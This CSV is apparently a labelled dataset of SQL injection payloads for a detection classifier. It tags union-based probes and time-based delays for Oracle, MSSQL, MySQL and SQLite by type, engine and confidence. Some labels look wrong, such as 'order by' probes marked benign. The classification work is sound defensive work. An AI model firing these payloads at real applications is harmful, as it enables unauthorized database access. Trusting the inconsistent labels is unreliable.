id,payload_inner,sqli_type,db_engine,confidence,reasoning,sources_agree
23815,"1"" ) ) as uels where 9447 = 9447 or 2633 = dbms_pipe.receive_message ( chr ( 112 ) ||chr ( 65 ) ||chr ( 65 ) ||chr ( 103 ) ,5 ) --",time_blind,oracle,1.0,"Signals: 'dbms_pipe', 'chr'; Time-blind SQLi (sleep/delay function); DB: oracle",2
23848,"1"" ) ) or 2633 = dbms_pipe.receive_message ( chr ( 112 ) ||chr ( 65 ) ||chr ( 65 ) ||chr ( 103 ) ,5 ) and ( ( ""rurz"" = ""rurz",time_blind,oracle,1.0,"Signals: 'dbms_pipe', 'chr'; Time-blind SQLi (sleep/delay function); DB: oracle",2
23912,"1' ) as ssxj where 3845 = 3845 or 7427 = dbms_pipe.receive_message ( chr ( 116 ) ||chr ( 87 ) ||chr ( 90 ) ||chr ( 109 ) ,5 ) --",time_blind,oracle,1.0,"Signals: 'dbms_pipe', 'chr'; Time-blind SQLi (sleep/delay function); DB: oracle",2
23817,1%' ) ) order by 1--,benign,mysql,0.9,Signals: 'ord'; DB: mysql. Payload length: 20 chars.,2
23833,waitfor delay '0:0:5' and '%' = ',time_blind,mssql,0.9,Signals: 'waitfor'; Time-blind SQLi (sleep/delay function); DB: mssql,2
23958,1 ) ) ) order by 1--,benign,mysql,0.9,Signals: 'ord'; DB: mysql. Payload length: 20 chars.,2
23964,-4768'|| ( select 'dded' from dual where 6499 = 6499 union all select 6499--,union_based,oracle,0.9,Signals: 'dual'; UNION-based payload detected; DB: oracle,2
23982,1' where 9003 = 9003 waitfor delay '0:0:5'--,time_blind,mssql,0.9,Signals: 'waitfor'; Time-blind SQLi (sleep/delay function); DB: mssql,2
23984,"1"" ) waitfor delay '0:0:5'--",time_blind,mssql,0.9,Signals: 'waitfor'; Time-blind SQLi (sleep/delay function); DB: mssql,2
23993,1 ) ) waitfor delay '0:0:5'--,time_blind,mssql,0.9,Signals: 'waitfor'; Time-blind SQLi (sleep/delay function); DB: mssql,2
23800,"1' ) as ohnu where 4097 = 4097 union all select null,null,null,null,null,null,null,null,null--",union_based,generic,0.7,UNION-based payload detected. Payload length: 94 chars.,2
23805,"1 ) union all select null,null,null,null,null,null#",union_based,generic,0.7,UNION-based payload detected. Payload length: 51 chars.,2
23806,"1"" ) and 9198 = 9198--",boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 22 chars.,2
23811,-3566%' or 2158 = 6289,boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 22 chars.,2
23813,"-7041"" ) ) ) union all select 2159,2159,2159,2159,2159--",union_based,generic,0.7,UNION-based payload detected. Payload length: 56 chars.,2
23825,"1 ) ) union all select null,null,null,null,null,null,null,null#",union_based,generic,0.7,UNION-based payload detected. Payload length: 63 chars.,2
23832,"-3781%' ) union all select 7497,7497,7497,7497,7497--",union_based,generic,0.7,UNION-based payload detected. Payload length: 53 chars.,2
23839,"-5169"" ) ) union all select 6198,6198,6198,6198--",union_based,generic,0.7,UNION-based payload detected. Payload length: 49 chars.,2
23846,"-8358' ) ) ) union all select 7282,7282--",union_based,generic,0.7,UNION-based payload detected. Payload length: 41 chars.,2
23847,-7726 or 3038 = 3038,boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 20 chars.,2
23853,"-6587' ) union all select 6349,6349,6349,6349,6349,6349,6349,6349,6349,6349--",union_based,generic,0.7,UNION-based payload detected. Payload length: 77 chars.,2
23858,"-9886%' ) ) ) union all select 5191,5191,5191,5191,5191,5191,5191--",union_based,generic,0.7,UNION-based payload detected. Payload length: 67 chars.,2
23860,"-9111"" or 3038 = 3038",boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 21 chars.,2
23861,"1"" ) ) ) union all select null--",union_based,generic,0.7,UNION-based payload detected. Payload length: 32 chars.,2
23863,-2022 ) ) ) or 6812 = 3516 and ( ( ( 3896 = 3896,boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 48 chars.,2
23864,-2505' or 9323 = 9323#,boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 22 chars.,2
23869,1 ) ) and 2886 = 1133--,boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 23 chars.,2
23871,"-4223' ) ) ) union all select 7913,7913,7913,7913,7913,7913,7913,7913,7913,7913#",union_based,generic,0.7,UNION-based payload detected. Payload length: 80 chars.,2
23877,-5820' ) ) as lkik where 4044 = 4044 or 7156 = 9197--,boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 53 chars.,2
23882,"1'+ ( select 'xqpe' where 4020 = 4020 union all select null,null--",union_based,generic,0.7,UNION-based payload detected. Payload length: 66 chars.,2
23886,-2411%' ) ) ) or 6872 = 6872 and ( ( ( '%' = ',boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 46 chars.,2
23887,1' ) and 4822 = 6997 and ( 'ojku' = 'ojku,boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 41 chars.,2
23888,-7950' ) or 9323 = 9323#,boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 24 chars.,2
23892,"1 where 2363 = 2363 union all select null,null,null,null,null--",union_based,generic,0.7,UNION-based payload detected. Payload length: 63 chars.,2
23895,"1%"" ) union all select null,null,null,null,null,null#",union_based,generic,0.7,UNION-based payload detected. Payload length: 53 chars.,2
23898,"-3300' union all select 8979,8979,8979,8979,8979,8979--",union_based,generic,0.7,UNION-based payload detected. Payload length: 55 chars.,2
23899,"1%' union all select null,null,null,null,null,null,null,null,null,null#",union_based,generic,0.7,UNION-based payload detected. Payload length: 71 chars.,2
23901,1' ) ) ) and 4069 = 8786 and ( ( ( 'eftr' = 'eftr,boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 49 chars.,2
23904,-7037' ) ) as epsg where 3684 = 3684 union all select 3684--,union_based,generic,0.7,UNION-based payload detected. Payload length: 60 chars.,2
23909,-3895' ) or 8645 = 5359--,boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 25 chars.,2
23910,"-2120"" ) union all select 9614--",union_based,generic,0.7,UNION-based payload detected. Payload length: 32 chars.,2
23911,1' ) and 7533 = 7533 and ( 'xyga' like 'xyga,boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 44 chars.,2
23918,1%' ) and 2949 = 4847 and ( '%' = ',boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 35 chars.,2
23919,"-1238' ) as lxur where 7075 = 7075 union all select 7075,7075,7075,7075,7075,7075,7075,7075,7075,7075#",union_based,generic,0.7,UNION-based payload detected. Payload length: 102 chars.,2
23922,-3966' ) or 7338 = 8657,boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 23 chars.,2
23924,"1%"" ) ) union all select null,null,null,null,null,null--",union_based,generic,0.7,UNION-based payload detected. Payload length: 56 chars.,2
23927,-4484' ) ) or 6872 = 6872 and ( ( 'oxuo' = 'oxuo,boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 48 chars.,2
23932,"1%"" and 1343 = 5939#",boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 20 chars.,2
23937,"-7202%"" ) ) union all select 2901#",union_based,generic,0.7,UNION-based payload detected. Payload length: 34 chars.,2
23939,-1280' ) ) or 8571 = 8571--,boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 27 chars.,2
23943,"-9003"" ) ) union all select 9721,9721--",union_based,generic,0.7,UNION-based payload detected. Payload length: 39 chars.,2
23945,-2483' where 1327 = 1327 union all select 1327#,union_based,generic,0.7,UNION-based payload detected. Payload length: 47 chars.,2
23946,"-8699"" ) union all select 8645,8645,8645,8645,8645,8645--",union_based,generic,0.7,UNION-based payload detected. Payload length: 57 chars.,2
23955,-6100' ) as kvfc where 2377 = 2377 or 6872 = 6872--,boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 51 chars.,2
23957,"1"" ) and 4595 = 4595#",boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 21 chars.,2
23961,1 where 9361 = 9361 and 7478 = 9170--,boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 37 chars.,2
23965,"1'|| ( select 'lzvb' where 1637 = 1637 union all select null,null,null,null,null,null,null,null#",union_based,generic,0.7,UNION-based payload detected. Payload length: 96 chars.,2
23966,"-8308"" ) union all select 3084,3084,3084,3084,3084,3084,3084,3084,3084#",union_based,generic,0.7,UNION-based payload detected. Payload length: 71 chars.,2
23969,"1' ) where 2284 = 2284 and make_set ( 8403 = 8403,8899 ) --",boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 59 chars.,2
23973,"1"" ) and 3732 = 3850 and ( ""edjv"" = ""edjv",boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 41 chars.,2
23974,1' ) ) union all select null#,union_based,generic,0.7,UNION-based payload detected. Payload length: 29 chars.,2
23975,"1"" ) ) and 7656 = 5604 and ( ( ""zuhv"" = ""zuhv",boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 45 chars.,2
23977,"1"" ) union all select null,null,null,null,null,null,null,null--",union_based,generic,0.7,UNION-based payload detected. Payload length: 63 chars.,2
23983,"-6639' ) as trll where 6271 = 6271 union all select 6271,6271,6271#",union_based,generic,0.7,UNION-based payload detected. Payload length: 67 chars.,2
23994,"1"" ) ) as bovm where 5560 = 5560 union all select null,null,null,null,null,null,null#",union_based,generic,0.7,UNION-based payload detected. Payload length: 85 chars.,2
23999,"-6599"" ) ) union all select 2870,2870,2870,2870,2870,2870,2870,2870,2870,2870--",union_based,generic,0.7,UNION-based payload detected. Payload length: 79 chars.,2
23824,"call regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) and ""rbqs"" = ""rbqs",boolean_blind,generic,1.0,"Signals: 'substring', 'substr', 'char'; Boolean-blind SQLi (OR/AND logic)",1
23835,"1%' or char ( 75 ) ||char ( 70 ) ||char ( 99 ) ||char ( 83 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) --",boolean_blind,generic,1.0,"Signals: 'substring', 'substr', 'char'; Boolean-blind SQLi (OR/AND logic)",1
23836,"1' ) and char ( 111 ) ||char ( 77 ) ||char ( 121 ) ||char ( 88 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) and ( 'qdsr' like 'qdsr",boolean_blind,generic,1.0,"Signals: 'substring', 'substr', 'char'; Boolean-blind SQLi (OR/AND logic)",1
23852,1' where 4403 = 4403 rlike sleep ( 5 ) #,time_blind,mysql,1.0,"Signals: 'sleep', 'rlike'; Time-blind SQLi (sleep/delay function); DB: mysql",1
23874,"1' ) ) ) or char ( 117 ) ||char ( 111 ) ||char ( 105 ) ||char ( 100 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) and ( ( ( 'akyc' = 'akyc",boolean_blind,generic,1.0,"Signals: 'substring', 'substr', 'char'; Boolean-blind SQLi (OR/AND logic)",1
23881,1' ) ) ) rlike sleep ( 5 ) and ( ( ( 'svuu' = 'svuu,time_blind,mysql,1.0,"Signals: 'sleep', 'rlike'; Time-blind SQLi (sleep/delay function); DB: mysql",1
23890,"call regexp_substring ( repeat ( right ( char ( 3702 ) ,0 ) ,500000000 ) ,null ) and ( ( ( 'opyt' = 'opyt",boolean_blind,generic,1.0,"Signals: 'substring', 'substr', 'char'; Boolean-blind SQLi (OR/AND logic)",1
23907,"1%' procedure analyse ( extractvalue ( 9627,concat ( 0x5c, ( benchmark ( 5000000,md5 ( 0x4b774c75 ) ) ) ) ) ,1 ) #",error_based,mysql,1.0,"Signals: 'extractvalue', 'benchmark', 'concat'; Error-based SQLi (extractvalue/updatexml); DB: mysql",1
23908,"1' ) as ssez where 5351 = 5351 or char ( 119 ) ||char ( 100 ) ||char ( 99 ) ||char ( 121 ) = regexp_substring ( repeat ( right ( char ( 1441 ) ,0 ) ,5000000000 ) ,null ) --",boolean_blind,generic,1.0,"Signals: 'substring', 'substr', 'char'; Boolean-blind SQLi (OR/AND logic)",1
23916,"1"" ) ) or char ( 117 ) ||char ( 111 ) ||char ( 105 ) ||char ( 100 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) and ( ( ""dbxi"" like ""dbxi",boolean_blind,generic,1.0,"Signals: 'substring', 'substr', 'char'; Boolean-blind SQLi (OR/AND logic)",1
23925,"1' ) where 8586 = 8586 and 3202 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) --",time_blind,sqlite,1.0,"Signals: 'randomblob', 'hex'; Time-blind SQLi (sleep/delay function); DB: sqlite",1
